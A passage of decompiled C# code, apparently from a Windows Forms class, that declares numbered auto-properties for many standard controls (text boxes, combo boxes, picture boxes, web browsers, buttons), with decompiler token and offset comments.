		// (set) Token: 0x060000FC RID: 252 RVA: 0x0000A09F File Offset: 0x0000829F
		internal virtual LinkLabel LinkLabel6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x060000FD RID: 253 RVA: 0x0000A0A8 File Offset: 0x000082A8
		// (set) Token: 0x060000FE RID: 254 RVA: 0x0000A0B0 File Offset: 0x000082B0
		internal virtual MaskedTextBox MaskedTextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x060000FF RID: 255 RVA: 0x0000A0B9 File Offset: 0x000082B9
		// (set) Token: 0x06000100 RID: 256 RVA: 0x0000A0C1 File Offset: 0x000082C1
		internal virtual ProgressBar ProgressBar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x06000101 RID: 257 RVA: 0x0000A0CA File Offset: 0x000082CA
		// (set) Token: 0x06000102 RID: 258 RVA: 0x0000A0D2 File Offset: 0x000082D2
		internal virtual PictureBox PictureBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x06000103 RID: 259 RVA: 0x0000A0DB File Offset: 0x000082DB
		// (set) Token: 0x06000104 RID: 260 RVA: 0x0000A0E3 File Offset: 0x000082E3
		internal virtual PictureBox PictureBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x06000105 RID: 261 RVA: 0x0000A0EC File Offset: 0x000082EC
		// (set) Token: 0x06000106 RID: 262 RVA: 0x0000A0F4 File Offset: 0x000082F4
		internal virtual WebBrowser WebBrowser6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x06000107 RID: 263 RVA: 0x0000A0FD File Offset: 0x000082FD
		// (set) Token: 0x06000108 RID: 264 RVA: 0x0000A105 File Offset: 0x00008305
		internal virtual TextBox TextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x06000109 RID: 265 RVA: 0x0000A10E File Offset: 0x0000830E
		// (set) Token: 0x0600010A RID: 266 RVA: 0x0000A116 File Offset: 0x00008316
		internal virtual RichTextBox RichTextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x0600010B RID: 267 RVA: 0x0000A11F File Offset: 0x0000831F
		// (set) Token: 0x0600010C RID: 268 RVA: 0x0000A127 File Offset: 0x00008327
		internal virtual RadioButton RadioButton6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x0600010D RID: 269 RVA: 0x0000A130 File Offset: 0x00008330
		// (set) Token: 0x0600010E RID: 270 RVA: 0x0000A138 File Offset: 0x00008338
		internal virtual NumericUpDown NumericUpDown6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x0600010F RID: 271 RVA: 0x0000A141 File Offset: 0x00008341
		// (set) Token: 0x06000110 RID: 272 RVA: 0x0000A149 File Offset: 0x00008349
		internal virtual MonthCalendar MonthCalendar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x06000111 RID: 273 RVA: 0x0000A152 File Offset: 0x00008352
		// (set) Token: 0x06000112 RID: 274 RVA: 0x0000A15A File Offset: 0x0000835A
		internal virtual MaskedTextBox MaskedTextBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x06000113 RID: 275 RVA: 0x0000A163 File Offset: 0x00008363
		// (set) Token: 0x06000114 RID: 276 RVA: 0x0000A16B File Offset: 0x0000836B
		internal virtual ListView ListView6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x06000115 RID: 277 RVA: 0x0000A174 File Offset: 0x00008374
		// (set) Token: 0x06000116 RID: 278 RVA: 0x0000A17C File Offset: 0x0000837C
		internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x06000117 RID: 279 RVA: 0x0000A185 File Offset: 0x00008385
		// (set) Token: 0x06000118 RID: 280 RVA: 0x0000A18D File Offset: 0x0000838D
		internal virtual ComboBox ComboBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x06000119 RID: 281 RVA: 0x0000A196 File Offset: 0x00008396
		// (set) Token: 0x0600011A RID: 282 RVA: 0x0000A19E File Offset: 0x0000839E
		internal virtual DateTimePicker DateTimePicker6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x0600011B RID: 283 RVA: 0x0000A1A7 File Offset: 0x000083A7
		// (set) Token: 0x0600011C RID: 284 RVA: 0x0000A1AF File Offset: 0x000083AF
		internal virtual CheckedListBox CheckedListBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x0600011D RID: 285 RVA: 0x0000A1B8 File Offset: 0x000083B8
		// (set) Token: 0x0600011E RID: 286 RVA: 0x0000A1C0 File Offset: 0x000083C0
		internal virtual CheckBox CheckBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x0600011F RID: 287 RVA: 0x0000A1C9 File Offset: 0x000083C9
		// (set) Token: 0x06000120 RID: 288 RVA: 0x0000A1D1 File Offset: 0x000083D1
		internal virtual Button Button6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x06000121 RID: 289 RVA: 0x0000A1DA File Offset: 0x000083DA
		// (set) Token: 0x06000122 RID: 290 RVA: 0x0000A1E2 File Offset: 0x000083E2
		internal virtual CheckedListBox CheckedListBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000093 RID: 147
		// (get) Token: 0x06000123 RID: 291 RVA: 0x0000A1EB File Offset: 0x000083EB
		// (set) Token: 0x06000124 RID: 292 RVA: 0x0000A1F3 File Offset: 0x000083F3
		internal virtual ComboBox ComboBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x06000125 RID: 293 RVA: 0x0000A1FC File Offset: 0x000083FC
		// (set) Token: 0x06000126 RID: 294 RVA: 0x0000A204 File Offset: 0x00008404
		internal virtual ListBox ListBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000095 RID: 149
		// (get) Token: 0x06000127 RID: 295 RVA: 0x0000A20D File Offset: 0x0000840D
		// (set) Token: 0x06000128 RID: 296 RVA: 0x0000A215 File Offset: 0x00008415
		internal virtual LinkLabel LinkLabel7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x06000129 RID: 297 RVA: 0x0000A21E File Offset: 0x0000841E
		// (set) Token: 0x0600012A RID: 298 RVA: 0x0000A226 File Offset: 0x00008426
		internal virtual MaskedTextBox MaskedTextBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x0600012B RID: 299 RVA: 0x0000A22F File Offset: 0x0000842F
		// (set) Token: 0x0600012C RID: 300 RVA: 0x0000A237 File Offset: 0x00008437
		internal virtual ProgressBar ProgressBar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x0600012D RID: 301 RVA: 0x0000A240 File Offset: 0x00008440
		// (set) Token: 0x0600012E RID: 302 RVA: 0x0000A248 File Offset: 0x00008448
		internal virtual PictureBox PictureBox13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x0600012F RID: 303 RVA: 0x0000A251 File Offset: 0x00008451
		// (set) Token: 0x06000130 RID: 304 RVA: 0x0000A259 File Offset: 0x00008459
		internal virtual PictureBox PictureBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x06000131 RID: 305 RVA: 0x0000A262 File Offset: 0x00008462
		// (set) Token: 0x06000132 RID: 306 RVA: 0x0000A26A File Offset: 0x0000846A
		internal virtual WebBrowser WebBrowser7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x06000133 RID: 307 RVA: 0x0000A273 File Offset: 0x00008473
		// (set) Token: 0x06000134 RID: 308 RVA: 0x0000A27B File Offset: 0x0000847B
		internal virtual TextBox TextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009C RID: 156
		// (get) Token: 0x06000135 RID: 309 RVA: 0x0000A284 File Offset: 0x00008484
		// (set) Token: 0x06000136 RID: 310 RVA: 0x0000A28C File Offset: 0x0000848C
		internal virtual RichTextBox RichTextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x06000137 RID: 311 RVA: 0x0000A295 File Offset: 0x00008495
		// (set) Token: 0x06000138 RID: 312 RVA: 0x0000A29D File Offset: 0x0000849D
		internal virtual NumericUpDown NumericUpDown7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009E RID: 158
		// (get) Token: 0x06000139 RID: 313 RVA: 0x0000A2A6 File Offset: 0x000084A6
		// (set) Token: 0x0600013A RID: 314 RVA: 0x0000A2AE File Offset: 0x000084AE
		internal virtual MonthCalendar MonthCalendar7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009F RID: 159
		// (get) Token: 0x0600013B RID: 315 RVA: 0x0000A2B7 File Offset: 0x000084B7
		// (set) Token: 0x0600013C RID: 316 RVA: 0x0000A2BF File Offset: 0x000084BF
		internal virtual MaskedTextBox MaskedTextBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x0600013D RID: 317 RVA: 0x0000A2C8 File Offset: 0x000084C8
		// (set) Token: 0x0600013E RID: 318 RVA: 0x0000A2D0 File Offset: 0x000084D0
		internal virtual ListView ListView7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x0600013F RID: 319 RVA: 0x0000A2D9 File Offset: 0x000084D9
		// (set) Token: 0x06000140 RID: 320 RVA: 0x0000A2E1 File Offset: 0x000084E1
		internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A2 RID: 162
		// (get) Token: 0x06000141 RID: 321 RVA: 0x0000A2EA File Offset: 0x000084EA
		// (set) Token: 0x06000142 RID: 322 RVA: 0x0000A2F2 File Offset: 0x000084F2
		internal virtual ComboBox ComboBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x06000143 RID: 323 RVA: 0x0000A2FB File Offset: 0x000084FB
		// (set) Token: 0x06000144 RID: 324 RVA: 0x0000A303 File Offset: 0x00008503
		internal virtual DateTimePicker DateTimePicker7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x06000145 RID: 325 RVA: 0x0000A30C File Offset: 0x0000850C
		// (set) Token: 0x06000146 RID: 326 RVA: 0x0000A314 File Offset: 0x00008514
		internal virtual CheckedListBox CheckedListBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x06000147 RID: 327 RVA: 0x0000A31D File Offset: 0x0000851D
		// (set) Token: 0x06000148 RID: 328 RVA: 0x0000A325 File Offset: 0x00008525
		internal virtual Button Button7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x06000149 RID: 329 RVA: 0x0000A32E File Offset: 0x0000852E
		// (set) Token: 0x0600014A RID: 330 RVA: 0x0000A336 File Offset: 0x00008536
		internal virtual CheckedListBox CheckedListBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A7 RID: 167
		// (get) Token: 0x0600014B RID: 331 RVA: 0x0000A33F File Offset: 0x0000853F
		// (set) Token: 0x0600014C RID: 332 RVA: 0x0000A347 File Offset: 0x00008547
		internal virtual ComboBox ComboBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A8 RID: 168
		// (get) Token: 0x0600014D RID: 333 RVA: 0x0000A350 File Offset: 0x00008550
		// (set) Token: 0x0600014E RID: 334 RVA: 0x0000A358 File Offset: 0x00008558
		internal virtual ListBox ListBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x0600014F RID: 335 RVA: 0x0000A361 File Offset: 0x00008561
		// (set) Token: 0x06000150 RID: 336 RVA: 0x0000A369 File Offset: 0x00008569
		internal virtual LinkLabel LinkLabel8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x06000151 RID: 337 RVA: 0x0000A372 File Offset: 0x00008572
		// (set) Token: 0x06000152 RID: 338 RVA: 0x0000A37A File Offset: 0x0000857A
		internal virtual MaskedTextBox MaskedTextBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x06000153 RID: 339 RVA: 0x0000A383 File Offset: 0x00008583
		// (set) Token: 0x06000154 RID: 340 RVA: 0x0000A38B File Offset: 0x0000858B
		internal virtual ProgressBar ProgressBar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x06000155 RID: 341 RVA: 0x0000A394 File Offset: 0x00008594
		// (set) Token: 0x06000156 RID: 342 RVA: 0x0000A39C File Offset: 0x0000859C
		internal virtual PictureBox PictureBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AD RID: 173
		// (get) Token: 0x06000157 RID: 343 RVA: 0x0000A3A5 File Offset: 0x000085A5
		// (set) Token: 0x06000158 RID: 344 RVA: 0x0000A3AD File Offset: 0x000085AD
		internal virtual PictureBox PictureBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x06000159 RID: 345 RVA: 0x0000A3B6 File Offset: 0x000085B6
		// (set) Token: 0x0600015A RID: 346 RVA: 0x0000A3BE File Offset: 0x000085BE
		internal virtual WebBrowser WebBrowser8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AF RID: 175
		// (get) Token: 0x0600015B RID: 347 RVA: 0x0000A3C7 File Offset: 0x000085C7
		// (set) Token: 0x0600015C RID: 348 RVA: 0x0000A3CF File Offset: 0x000085CF
		internal virtual TextBox TextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B0 RID: 176
		// (get) Token: 0x0600015D RID: 349 RVA: 0x0000A3D8 File Offset: 0x000085D8
		// (set) Token: 0x0600015E RID: 350 RVA: 0x0000A3E0 File Offset: 0x000085E0
		internal virtual RichTextBox RichTextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x0600015F RID: 351 RVA: 0x0000A3E9 File Offset: 0x000085E9
		// (set) Token: 0x06000160 RID: 352 RVA: 0x0000A3F1 File Offset: 0x000085F1
		internal virtual NumericUpDown NumericUpDown8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x06000161 RID: 353 RVA: 0x0000A3FA File Offset: 0x000085FA
		// (set) Token: 0x06000162 RID: 354 RVA: 0x0000A402 File Offset: 0x00008602
		internal virtual MonthCalendar MonthCalendar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x06000163 RID: 355 RVA: 0x0000A40B File Offset: 0x0000860B
		// (set) Token: 0x06000164 RID: 356 RVA: 0x0000A413 File Offset: 0x00008613
		internal virtual MaskedTextBox MaskedTextBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B4 RID: 180
		// (get) Token: 0x06000165 RID: 357 RVA: 0x0000A41C File Offset: 0x0000861C
		// (set) Token: 0x06000166 RID: 358 RVA: 0x0000A424 File Offset: 0x00008624
		internal virtual ListView ListView8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B5 RID: 181
		// (get) Token: 0x06000167 RID: 359 RVA: 0x0000A42D File Offset: 0x0000862D
		// (set) Token: 0x06000168 RID: 360 RVA: 0x0000A435 File Offset: 0x00008635
		internal virtual Label Label8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B6 RID: 182
		// (get) Token: 0x06000169 RID: 361 RVA: 0x0000A43E File Offset: 0x0000863E
		// (set) Token: 0x0600016A RID: 362 RVA: 0x0000A446 File Offset: 0x00008646
		internal virtual ComboBox ComboBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x0600016B RID: 363 RVA: 0x0000A44F File Offset: 0x0000864F
		// (set) Token: 0x0600016C RID: 364 RVA: 0x0000A457 File Offset: 0x00008657
		internal virtual DateTimePicker DateTimePicker8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x0600016D RID: 365 RVA: 0x0000A460 File Offset: 0x00008660
		// (set) Token: 0x0600016E RID: 366 RVA: 0x0000A468 File Offset: 0x00008668
		internal virtual CheckedListBox CheckedListBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x0600016F RID: 367 RVA: 0x0000A471 File Offset: 0x00008671
		// (set) Token: 0x06000170 RID: 368 RVA: 0x0000A479 File Offset: 0x00008679
		internal virtual Button Button8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BA RID: 186
		// (get) Token: 0x06000171 RID: 369 RVA: 0x0000A482 File Offset: 0x00008682
		// (set) Token: 0x06000172 RID: 370 RVA: 0x0000A48A File Offset: 0x0000868A
		internal virtual CheckedListBox CheckedListBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BB RID: 187
		// (get) Token: 0x06000173 RID: 371 RVA: 0x0000A493 File Offset: 0x00008693
		// (set) Token: 0x06000174 RID: 372 RVA: 0x0000A49B File Offset: 0x0000869B
		internal virtual ComboBox ComboBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BC RID: 188
		// (get) Token: 0x06000175 RID: 373 RVA: 0x0000A4A4 File Offset: 0x000086A4
		// (set) Token: 0x06000176 RID: 374 RVA: 0x0000A4AC File Offset: 0x000086AC
		internal virtual ListBox ListBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BD RID: 189
		// (get) Token: 0x06000177 RID: 375 RVA: 0x0000A4B5 File Offset: 0x000086B5
		// (set) Token: 0x06000178 RID: 376 RVA: 0x0000A4BD File Offset: 0x000086BD
		internal virtual LinkLabel LinkLabel9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BE RID: 190
		// (get) Token: 0x06000179 RID: 377 RVA: 0x0000A4C6 File Offset: 0x000086C6
		// (set) Token: 0x0600017A RID: 378 RVA: 0x0000A4CE File Offset: 0x000086CE
		internal virtual MaskedTextBox MaskedTextBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x0600017B RID: 379 RVA: 0x0000A4D7 File Offset: 0x000086D7
		// (set) Token: 0x0600017C RID: 380 RVA: 0x0000A4DF File Offset: 0x000086DF
		internal virtual ProgressBar ProgressBar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x0600017D RID: 381 RVA: 0x0000A4E8 File Offset: 0x000086E8
		// (set) Token: 0x0600017E RID: 382 RVA: 0x0000A4F0 File Offset: 0x000086F0
		internal virtual PictureBox PictureBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x0600017F RID: 383 RVA: 0x0000A4F9 File Offset: 0x000086F9
		// (set) Token: 0x06000180 RID: 384 RVA: 0x0000A501 File Offset: 0x00008701
		internal virtual PictureBox PictureBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C2 RID: 194
		// (get) Token: 0x06000181 RID: 385 RVA: 0x0000A50A File Offset: 0x0000870A
		// (set) Token: 0x06000182 RID: 386 RVA: 0x0000A512 File Offset: 0x00008712
		internal virtual WebBrowser WebBrowser9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C3 RID: 195
		// (get) Token: 0x06000183 RID: 387 RVA: 0x0000A51B File Offset: 0x0000871B
		// (set) Token: 0x06000184 RID: 388 RVA: 0x0000A523 File Offset: 0x00008723
		internal virtual TextBox TextBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x06000185 RID: 389 RVA: 0x0000A52C File Offset: 0x0000872C
		// (set) Token: 0x06000186 RID: 390 RVA: 0x0000A534 File Offset: 0x00008734
		internal virtual RichTextBox RichTextBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x06000187 RID: 391 RVA: 0x0000A53D File Offset: 0x0000873D
		// (set) Token: 0x06000188 RID: 392 RVA: 0x0000A545 File Offset: 0x00008745
		internal virtual RadioButton RadioButton7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x06000189 RID: 393 RVA: 0x0000A54E File Offset: 0x0000874E
		// (set) Token: 0x0600018A RID: 394 RVA: 0x0000A556 File Offset: 0x00008756
		internal virtual NumericUpDown NumericUpDown9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x0600018B RID: 395 RVA: 0x0000A55F File Offset: 0x0000875F
		// (set) Token: 0x0600018C RID: 396 RVA: 0x0000A567 File Offset: 0x00008767
		internal virtual MonthCalendar MonthCalendar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x0600018D RID: 397 RVA: 0x0000A570 File Offset: 0x00008770
		// (set) Token: 0x0600018E RID: 398 RVA: 0x0000A578 File Offset: 0x00008778
		internal virtual MaskedTextBox MaskedTextBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x0600018F RID: 399 RVA: 0x0000A581 File Offset: 0x00008781
		// (set) Token: 0x06000190 RID: 400 RVA: 0x0000A589 File Offset: 0x00008789
		internal virtual ListView ListView9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x06000191 RID: 401 RVA: 0x0000A592 File Offset: 0x00008792
		// (set) Token: 0x06000192 RID: 402 RVA: 0x0000A59A File Offset: 0x0000879A
		internal virtual Label Label9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CB RID: 203
		// (get) Token: 0x06000193 RID: 403 RVA: 0x0000A5A3 File Offset: 0x000087A3
		// (set) Token: 0x06000194 RID: 404 RVA: 0x0000A5AB File Offset: 0x000087AB
		internal virtual ComboBox ComboBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x06000195 RID: 405 RVA: 0x0000A5B4 File Offset: 0x000087B4
		// (set) Token: 0x06000196 RID: 406 RVA: 0x0000A5BC File Offset: 0x000087BC
		internal virtual DateTimePicker DateTimePicker9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CD RID: 205
		// (get) Token: 0x06000197 RID: 407 RVA: 0x0000A5C5 File Offset: 0x000087C5
		// (set) Token: 0x06000198 RID: 408 RVA: 0x0000A5CD File Offset: 0x000087CD
		internal virtual CheckedListBox CheckedListBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x06000199 RID: 409 RVA: 0x0000A5D6 File Offset: 0x000087D6
		// (set) Token: 0x0600019A RID: 410 RVA: 0x0000A5DE File Offset: 0x000087DE
		internal virtual Button Button9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x0600019B RID: 411 RVA: 0x0000A5E7 File Offset: 0x000087E7
		// (set) Token: 0x0600019C RID: 412 RVA: 0x0000A5EF File Offset: 0x000087EF
		internal virtual CheckedListBox CheckedListBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x0600019D RID: 413 RVA: 0x0000A5F8 File Offset: 0x000087F8
		// (set) Token: 0x0600019E RID: 414 RVA: 0x0000A600 File Offset: 0x00008800
		internal virtual ComboBox ComboBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x0600019F RID: 415 RVA: 0x0000A609 File Offset: 0x00008809
		// (set) Token: 0x060001A0 RID: 416 RVA: 0x0000A611 File Offset: 0x00008811
		internal virtual ListBox ListBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x060001A1 RID: 417 RVA: 0x0000A61A File Offset: 0x0000881A
		// (set) Token: 0x060001A2 RID: 418 RVA: 0x0000A622 File Offset: 0x00008822
		internal virtual LinkLabel LinkLabel10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x060001A3 RID: 419 RVA: 0x0000A62B File Offset: 0x0000882B
		// (set) Token: 0x060001A4 RID: 420 RVA: 0x0000A633 File Offset: 0x00008833
		internal virtual MaskedTextBox MaskedTextBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x060001A5 RID: 421 RVA: 0x0000A63C File Offset: 0x0000883C
		// (set) Token: 0x060001A6 RID: 422 RVA: 0x0000A644 File Offset: 0x00008844
		internal virtual ProgressBar ProgressBar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x060001A7 RID: 423 RVA: 0x0000A64D File Offset: 0x0000884D
		// (set) Token: 0x060001A8 RID: 424 RVA: 0x0000A655 File Offset: 0x00008855
		internal virtual PictureBox PictureBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x060001A9 RID: 425 RVA: 0x0000A65E File Offset: 0x0000885E
		// (set) Token: 0x060001AA RID: 426 RVA: 0x0000A666 File Offset: 0x00008866
		internal virtual PictureBox PictureBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x060001AB RID: 427 RVA: 0x0000A66F File Offset: 0x0000886F
		// (set) Token: 0x060001AC RID: 428 RVA: 0x0000A677 File Offset: 0x00008877
		internal virtual WebBrowser WebBrowser10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x060001AD RID: 429 RVA: 0x0000A680 File Offset: 0x00008880
		// (set) Token: 0x060001AE RID: 430 RVA: 0x0000A688 File Offset: 0x00008888
		internal virtual TextBox TextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x060001AF RID: 431 RVA: 0x0000A691 File Offset: 0x00008891
		// (set) Token: 0x060001B0 RID: 432 RVA: 0x0000A699 File Offset: 0x00008899
		internal virtual RichTextBox RichTextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DA RID: 218
		// (get) Token: 0x060001B1 RID: 433 RVA: 0x0000A6A2 File Offset: 0x000088A2
		// (set) Token: 0x060001B2 RID: 434 RVA: 0x0000A6AA File Offset: 0x000088AA
		internal virtual NumericUpDown NumericUpDown10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DB RID: 219
		// (get) Token: 0x060001B3 RID: 435 RVA: 0x0000A6B3 File Offset: 0x000088B3
		// (set) Token: 0x060001B4 RID: 436 RVA: 0x0000A6BB File Offset: 0x000088BB
		internal virtual MonthCalendar MonthCalendar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DC RID: 220
		// (get) Token: 0x060001B5 RID: 437 RVA: 0x0000A6C4 File Offset: 0x000088C4
